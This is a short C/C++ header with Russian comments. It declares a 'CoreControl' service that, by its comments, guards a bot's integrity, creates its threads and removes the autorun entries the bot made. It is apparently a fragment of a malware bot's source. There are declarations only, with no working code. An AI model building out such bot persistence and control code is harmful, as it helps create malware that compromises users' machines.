/*
  Сервси контроля цельности бота.
*/
#pragma once

#include "..\common\threadsgroup.h"

namespace CoreControl
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Создание потоков.

    IN OUT group - группа потокок, к которой будут принадлежать потоки сервиса.
    
    Return       - true - в случаи успеха,
                   false - в случаи ошибки.
  */
  bool _create(ThreadsGroup::GROUP *group);

  /*
    Удаление всех значений из системы, созданных ботом для автозапуска.
    
    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _removeAutorun(void);
};
